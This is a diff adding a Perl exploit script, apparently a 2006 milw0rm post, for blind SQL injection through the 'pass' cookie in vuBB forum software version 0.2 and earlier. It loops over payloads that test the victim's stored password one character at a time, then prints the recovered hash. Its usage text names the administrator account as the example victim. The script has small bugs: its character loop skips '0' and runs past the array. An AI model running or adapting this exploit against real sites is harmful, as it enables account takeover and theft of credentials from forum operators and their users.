@@ -1,0 +1,70 @@
+#!/usr/bin/perl 
+print q{
+----------------------------------------------------------------------
+
+	vuBB <=0.2 Final Remote SQL Injection (cookies) Exploit
+	
+		exploit discovered and coded by KingOfSKa
+			
+			https://contropotere.netsons.org
+
+----------------------------------------------------------------------
+
+};
+
+use LWP::UserAgent;
+
+   $ua = new LWP::UserAgent;
+   $ua->agent("Mosiac 1.0" . $ua->agent);
+
+if (!$ARGV[0]) {$ARGV[0] = '';}
+if (!$ARGV[1]) {$ARGV[1] = '1';}
+
+my $path = $ARGV[0] . '/index.php';
+my $user = $ARGV[1];   # userid to jack
+my $uname = $ARGV[2];
+my $answer = "";
+my @charset = ("0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f");
+if (!$ARGV[2])
+{
+        print q{
+		Usage:
+		
+		perl vubb.pl FULL_URL_TO_VBB VICTIM_USER_ID USER_NICKNAME
+		perl vubb.pl http://www.somesite.com/vubb 1 administrator
+		
+		};
+exit();
+
+}
+print "[URL:] $path\r\n";
+print "[USERID:] $user\r\n";
+print "[USERNAME:] $user\r\n";
+print "Starting connection...\r\n";
+
+my $j = 0 ;
+for( $i=1; $i < 33; $i++ )
+{
+        for( $j=1; $j < 17; $j++ )
+        {
+	
+                $current = $charset[$j];
+		
+  my $sql = "99%27+OR+(id%3d".$user."+AND+MID(pass,".$i.",1)%3d%27".$charset[$j]."%27)/*"; 
+                my @cookie = ('Cookie' => "user=kingofska; pass=$sql;");
+                my $res = $ua->get($path, @cookie);
+
+                $answer = $res->content;
+		#print $answer; #Just for debugging...
+		if ($answer =~/(.*)Welcome $uname(.*)/){$outputs.= $current; print "$i/32 found...\r\n"; }
+	}
+
+ 
+}
+
+
+if ( length($outputs) < 1 )   { print "Not Exploitable!\r\n"; exit;     }
+print  "User Hash is: $outputs \r\n";
+exit;
+
+# milw0rm.com [2006-03-01]
